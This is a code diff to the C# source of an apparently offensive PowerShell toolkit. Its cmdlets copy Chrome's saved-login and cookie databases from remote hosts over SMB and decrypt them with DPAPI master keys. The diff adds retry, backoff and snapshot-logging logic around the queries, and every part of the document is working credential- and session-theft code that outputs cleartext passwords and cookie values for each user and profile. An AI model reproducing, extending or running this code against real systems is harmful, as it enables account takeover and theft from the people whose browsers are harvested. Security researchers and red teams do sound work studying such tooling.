@@ -7,6 +7,7 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Text.Json;
 using System.Threading;
+using System.Threading.Tasks;
 using Microsoft.Data.Sqlite;
 using Titanis;
 using Titanis.Net;
@@ -207,6 +208,52 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			catch
 			{
 				return null;
+			}
+		}
+
+		internal static string DescribeSqliteSnapshotFiles(string localDbPath)
+		{
+			if (string.IsNullOrWhiteSpace(localDbPath))
+				return "db=<empty>, wal=<empty>, shm=<empty>";
+
+			static long? TryGetFileLength(string path)
+			{
+				try
+				{
+					if (!File.Exists(path))
+						return null;
+					return new FileInfo(path).Length;
+				}
+				catch
+				{
+					return null;
+				}
+			}
+
+			var dbSize = TryGetFileLength(localDbPath);
+			var walSize = TryGetFileLength(localDbPath + "-wal");
+			var shmSize = TryGetFileLength(localDbPath + "-shm");
+
+			string dbText = dbSize.HasValue ? $"{dbSize.Value} bytes" : "missing";
+			string walText = walSize.HasValue ? $"{walSize.Value} bytes" : "missing";
+			string shmText = shmSize.HasValue ? $"{shmSize.Value} bytes" : "missing";
+
+			return $"db={dbText}, wal={walText}, shm={shmText}";
+		}
+
+		internal static void DelayWithBackoff(int attempt, CancellationToken cancellationToken)
+		{
+			// Short, bounded backoff to avoid hammering the remote DB while it's being written.
+			int factor = attempt < 1 ? 1 : attempt;
+			int delayMs = Math.Min(factor * 200, 1000);
+
+			try
+			{
+				Task.Delay(delayMs, cancellationToken).GetAwaiter().GetResult();
+			}
+			catch (OperationCanceledException)
+			{
+				// Best-effort.
 			}
 		}
 
@@ -840,23 +887,15 @@ namespace Titanis.Tbo.Smb2.PowerShell
 						this.LogVerbose(smb, $"Get-TBOChromeLogins could not resolve AES state key for {localStatePath}: {stateKeyFailure}");
 				}
 
-				if (!ChromeSqliteSnapshot.TryCreate(smb, loginDataPath, cancellationToken, msg => this.LogVerbose(smb, msg), out var snapshot, out var snapshotFailure))
-				{
-					if (!string.IsNullOrWhiteSpace(snapshotFailure))
-						this.LogVerbose(smb, $"Get-TBOChromeLogins could not read {loginDataPath}: {snapshotFailure}");
-					continue;
-				}
-
-				using var snap = snapshot!;
-				ProcessLoginDb(
+				ProcessLoginDbWithRetries(
 					smb,
 					serverName,
 					user,
 					profileName,
-					loginDataPath.ToString(),
-					snap.DatabasePath,
+					loginDataPath,
 					stateKey,
-					masterKeySet);
+					masterKeySet,
+					cancellationToken);
 			}
 		}
 
@@ -866,7 +905,61 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			base.StopProcessing();
 		}
 
-		private void ProcessLoginDb(
+		private void ProcessLoginDbWithRetries(
+			ISmbProviderInfo smb,
+			string serverName,
+			string userName,
+			string profileName,
+			UncPath loginDataPath,
+			byte[]? aesStateKey,
+			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
+			CancellationToken cancellationToken)
+		{
+			const int MaxAttempts = 3;
+
+			Exception? lastFailure = null;
+			for (int attempt = 1; attempt <= MaxAttempts; attempt++)
+			{
+				cancellationToken.ThrowIfCancellationRequested();
+
+				if (!ChromeSqliteSnapshot.TryCreate(smb, loginDataPath, cancellationToken, msg => this.LogVerbose(smb, msg), out var snapshot, out var snapshotFailure))
+				{
+					if (!string.IsNullOrWhiteSpace(snapshotFailure))
+						this.LogVerbose(smb, $"Get-TBOChromeLogins could not read {loginDataPath}: {snapshotFailure}");
+					return;
+				}
+
+				using var snap = snapshot!;
+				this.LogVerbose(smb, $"Get-TBOChromeLogins SQLite snapshot attempt {attempt}/{MaxAttempts} for {loginDataPath}: {ChromeHelpers.DescribeSqliteSnapshotFiles(snap.DatabasePath)}");
+
+				try
+				{
+					ProcessLoginDbOnce(
+						smb,
+						serverName,
+						userName,
+						profileName,
+						loginDataPath.ToString(),
+						snap.DatabasePath,
+						aesStateKey,
+						masterKeySet);
+					return;
+				}
+				catch (Exception ex)
+				{
+					lastFailure = ex;
+					this.LogVerbose(smb, $"Get-TBOChromeLogins SQLite query attempt {attempt}/{MaxAttempts} failed for {loginDataPath}: {ex.GetType().Name}: {ex.Message}");
+
+					if (attempt < MaxAttempts)
+						ChromeHelpers.DelayWithBackoff(attempt, cancellationToken);
+				}
+			}
+
+			if (lastFailure != null)
+				this.LogException(smb, $"Get-TBOChromeLogins failed to query SQLite db '{loginDataPath}' after {MaxAttempts} attempts", lastFailure);
+		}
+
+		private void ProcessLoginDbOnce(
 			ISmbProviderInfo smb,
 			string serverName,
 			string userName,
@@ -876,64 +969,57 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			byte[]? aesStateKey,
 			IReadOnlyDictionary<Guid, byte[]> masterKeySet)
 		{
-			try
+			var builder = new SqliteConnectionStringBuilder
 			{
-				var builder = new SqliteConnectionStringBuilder
-				{
-					DataSource = localDbPath,
-					Mode = SqliteOpenMode.ReadOnly,
-					Cache = SqliteCacheMode.Shared
-				};
+				DataSource = localDbPath,
+				Mode = SqliteOpenMode.ReadOnly,
+				Cache = SqliteCacheMode.Shared
+			};
 
-				using var conn = new SqliteConnection(builder.ToString());
-				conn.Open();
+			using var conn = new SqliteConnection(builder.ToString());
+			conn.Open();
 
-				using var cmd = conn.CreateCommand();
-				cmd.CommandText = "SELECT origin_url, action_url, username_value, password_value FROM logins";
+			using var cmd = conn.CreateCommand();
+			cmd.CommandText = "SELECT origin_url, action_url, username_value, password_value FROM logins";
 
-				using var reader = cmd.ExecuteReader();
-				while (reader.Read())
-				{
-					string? originUrl = reader.IsDBNull(0) ? null : reader.GetString(0);
-					string? actionUrl = reader.IsDBNull(1) ? null : reader.GetString(1);
-					string? userNameValue = reader.IsDBNull(2) ? null : reader.GetString(2);
-					byte[] passwordValue = reader.IsDBNull(3) ? Array.Empty<byte>() : reader.GetFieldValue<byte[]>(3);
-
-					ChromeCrypto.DecryptChromeValue(
-						passwordValue,
-						aesStateKey,
-						masterKeySet,
-						logVerbose: msg => this.LogVerbose(smb, msg),
-						out var cleartext,
-						out var cleartextHex,
-						out var cleartextBytes,
-						out var encryptionType,
-						out var masterKeyGuid,
-						out var hmacValidated,
-						out var failureReason);
-
-					this.WriteObject(new TboChromeLoginInfo
-					{
-						ServerName = serverName,
-						UserName = userName,
-						ProfileName = profileName,
-						SourcePath = sourcePath,
-						OriginUrl = originUrl,
-						ActionUrl = actionUrl,
-						UserNameValue = userNameValue,
-						Password = cleartext,
-						PasswordHex = cleartextHex,
-						PasswordBytes = cleartextBytes,
-						EncryptionType = encryptionType,
-						MasterKeyGuid = masterKeyGuid,
-						HmacValidated = hmacValidated,
-						FailureReason = failureReason
-					});
-				}
-			}
-			catch (Exception ex)
+			using var reader = cmd.ExecuteReader();
+			while (reader.Read())
 			{
-				this.LogException(smb, $"Get-TBOChromeLogins failed to query SQLite db '{sourcePath}'", ex);
+				string? originUrl = reader.IsDBNull(0) ? null : reader.GetString(0);
+				string? actionUrl = reader.IsDBNull(1) ? null : reader.GetString(1);
+				string? userNameValue = reader.IsDBNull(2) ? null : reader.GetString(2);
+				byte[] passwordValue = reader.IsDBNull(3) ? Array.Empty<byte>() : reader.GetFieldValue<byte[]>(3);
+
+				ChromeCrypto.DecryptChromeValue(
+					passwordValue,
+					aesStateKey,
+					masterKeySet,
+					logVerbose: msg => this.LogVerbose(smb, msg),
+					out var cleartext,
+					out var cleartextHex,
+					out var cleartextBytes,
+					out var encryptionType,
+					out var masterKeyGuid,
+					out var hmacValidated,
+					out var failureReason);
+
+				this.WriteObject(new TboChromeLoginInfo
+				{
+					ServerName = serverName,
+					UserName = userName,
+					ProfileName = profileName,
+					SourcePath = sourcePath,
+					OriginUrl = originUrl,
+					ActionUrl = actionUrl,
+					UserNameValue = userNameValue,
+					Password = cleartext,
+					PasswordHex = cleartextHex,
+					PasswordBytes = cleartextBytes,
+					EncryptionType = encryptionType,
+					MasterKeyGuid = masterKeyGuid,
+					HmacValidated = hmacValidated,
+					FailureReason = failureReason
+				});
 			}
 		}
 	}
@@ -1027,28 +1113,53 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
 			CancellationToken cancellationToken)
 		{
-			if (!ChromeSqliteSnapshot.TryCreate(smb, remoteCookiesPath, cancellationToken, msg => this.LogVerbose(smb, msg), out var snapshot, out var snapshotFailure))
+			const int MaxAttempts = 3;
+
+			Exception? lastFailure = null;
+			for (int attempt = 1; attempt <= MaxAttempts; attempt++)
 			{
-				if (!string.IsNullOrWhiteSpace(snapshotFailure))
-					this.LogVerbose(smb, $"Get-TBOChromeCookies could not read {remoteCookiesPath}: {snapshotFailure}");
-				return false;
+				cancellationToken.ThrowIfCancellationRequested();
+
+				if (!ChromeSqliteSnapshot.TryCreate(smb, remoteCookiesPath, cancellationToken, msg => this.LogVerbose(smb, msg), out var snapshot, out var snapshotFailure))
+				{
+					if (!string.IsNullOrWhiteSpace(snapshotFailure))
+						this.LogVerbose(smb, $"Get-TBOChromeCookies could not read {remoteCookiesPath}: {snapshotFailure}");
+					return false;
+				}
+
+				using var snap = snapshot!;
+				this.LogVerbose(smb, $"Get-TBOChromeCookies SQLite snapshot attempt {attempt}/{MaxAttempts} for {remoteCookiesPath}: {ChromeHelpers.DescribeSqliteSnapshotFiles(snap.DatabasePath)}");
+
+				try
+				{
+					ProcessCookiesDbOnce(
+						smb,
+						serverName,
+						userName,
+						profileName,
+						remoteCookiesPath.ToString(),
+						snap.DatabasePath,
+						aesStateKey,
+						masterKeySet);
+					return true;
+				}
+				catch (Exception ex)
+				{
+					lastFailure = ex;
+					this.LogVerbose(smb, $"Get-TBOChromeCookies SQLite query attempt {attempt}/{MaxAttempts} failed for {remoteCookiesPath}: {ex.GetType().Name}: {ex.Message}");
+
+					if (attempt < MaxAttempts)
+						ChromeHelpers.DelayWithBackoff(attempt, cancellationToken);
+				}
 			}
 
-			using var snap = snapshot!;
-			ProcessCookiesDb(
-				smb,
-				serverName,
-				userName,
-				profileName,
-				remoteCookiesPath.ToString(),
-				snap.DatabasePath,
-				aesStateKey,
-				masterKeySet);
+			if (lastFailure != null)
+				this.LogException(smb, $"Get-TBOChromeCookies failed to query SQLite db '{remoteCookiesPath}' after {MaxAttempts} attempts", lastFailure);
 
 			return true;
 		}
 
-		private void ProcessCookiesDb(
+		private void ProcessCookiesDbOnce(
 			ISmbProviderInfo smb,
 			string serverName,
 			string userName,
@@ -1058,86 +1169,79 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			byte[]? aesStateKey,
 			IReadOnlyDictionary<Guid, byte[]> masterKeySet)
 		{
-			try
+			var builder = new SqliteConnectionStringBuilder
 			{
-				var builder = new SqliteConnectionStringBuilder
+				DataSource = localDbPath,
+				Mode = SqliteOpenMode.ReadOnly,
+				Cache = SqliteCacheMode.Shared
+			};
+
+			using var conn = new SqliteConnection(builder.ToString());
+			conn.Open();
+
+			using var cmd = conn.CreateCommand();
+			cmd.CommandText = "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies";
+
+			using var reader = cmd.ExecuteReader();
+			while (reader.Read())
+			{
+				string? hostKey = reader.IsDBNull(0) ? null : reader.GetString(0);
+				string? name = reader.IsDBNull(1) ? null : reader.GetString(1);
+				string? path = reader.IsDBNull(2) ? null : reader.GetString(2);
+
+				long expiresRaw = 0;
+				if (!reader.IsDBNull(3))
 				{
-					DataSource = localDbPath,
-					Mode = SqliteOpenMode.ReadOnly,
-					Cache = SqliteCacheMode.Shared
-				};
-
-				using var conn = new SqliteConnection(builder.ToString());
-				conn.Open();
-
-				using var cmd = conn.CreateCommand();
-				cmd.CommandText = "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, encrypted_value FROM cookies";
-
-				using var reader = cmd.ExecuteReader();
-				while (reader.Read())
-				{
-					string? hostKey = reader.IsDBNull(0) ? null : reader.GetString(0);
-					string? name = reader.IsDBNull(1) ? null : reader.GetString(1);
-					string? path = reader.IsDBNull(2) ? null : reader.GetString(2);
-
-					long expiresRaw = 0;
-					if (!reader.IsDBNull(3))
-					{
-						try { expiresRaw = reader.GetInt64(3); } catch { expiresRaw = 0; }
-					}
-
-					bool? isSecure = null;
-					if (!reader.IsDBNull(4))
-					{
-						try { isSecure = reader.GetInt32(4) != 0; } catch { }
-					}
-
-					bool? isHttpOnly = null;
-					if (!reader.IsDBNull(5))
-					{
-						try { isHttpOnly = reader.GetInt32(5) != 0; } catch { }
-					}
-
-					byte[] encryptedValue = reader.IsDBNull(6) ? Array.Empty<byte>() : reader.GetFieldValue<byte[]>(6);
-
-					ChromeCrypto.DecryptChromeValue(
-						encryptedValue,
-						aesStateKey,
-						masterKeySet,
-						logVerbose: msg => this.LogVerbose(smb, msg),
-						out var cleartext,
-						out var cleartextHex,
-						out var cleartextBytes,
-						out var encryptionType,
-						out var masterKeyGuid,
-						out var hmacValidated,
-						out var failureReason);
-
-					this.WriteObject(new TboChromeCookieInfo
-					{
-						ServerName = serverName,
-						UserName = userName,
-						ProfileName = profileName,
-						SourcePath = sourcePath,
-						HostKey = hostKey,
-						Name = name,
-						Path = path,
-						ExpiresUtc = ChromeHelpers.TryConvertChromeTimestamp(expiresRaw),
-						IsSecure = isSecure,
-						IsHttpOnly = isHttpOnly,
-						Value = cleartext,
-						ValueHex = cleartextHex,
-						ValueBytes = cleartextBytes,
-						EncryptionType = encryptionType,
-						MasterKeyGuid = masterKeyGuid,
-						HmacValidated = hmacValidated,
-						FailureReason = failureReason
-					});
+					try { expiresRaw = reader.GetInt64(3); } catch { expiresRaw = 0; }
 				}
-			}
-			catch (Exception ex)
-			{
-				this.LogException(smb, $"Get-TBOChromeCookies failed to query SQLite db '{sourcePath}'", ex);
+
+				bool? isSecure = null;
+				if (!reader.IsDBNull(4))
+				{
+					try { isSecure = reader.GetInt32(4) != 0; } catch { }
+				}
+
+				bool? isHttpOnly = null;
+				if (!reader.IsDBNull(5))
+				{
+					try { isHttpOnly = reader.GetInt32(5) != 0; } catch { }
+				}
+
+				byte[] encryptedValue = reader.IsDBNull(6) ? Array.Empty<byte>() : reader.GetFieldValue<byte[]>(6);
+
+				ChromeCrypto.DecryptChromeValue(
+					encryptedValue,
+					aesStateKey,
+					masterKeySet,
+					logVerbose: msg => this.LogVerbose(smb, msg),
+					out var cleartext,
+					out var cleartextHex,
+					out var cleartextBytes,
+					out var encryptionType,
+					out var masterKeyGuid,
+					out var hmacValidated,
+					out var failureReason);
+
+				this.WriteObject(new TboChromeCookieInfo
+				{
+					ServerName = serverName,
+					UserName = userName,
+					ProfileName = profileName,
+					SourcePath = sourcePath,
+					HostKey = hostKey,
+					Name = name,
+					Path = path,
+					ExpiresUtc = ChromeHelpers.TryConvertChromeTimestamp(expiresRaw),
+					IsSecure = isSecure,
+					IsHttpOnly = isHttpOnly,
+					Value = cleartext,
+					ValueHex = cleartextHex,
+					ValueBytes = cleartextBytes,
+					EncryptionType = encryptionType,
+					MasterKeyGuid = masterKeyGuid,
+					HmacValidated = hmacValidated,
+					FailureReason = failureReason
+				});
 			}
 		}
 	}
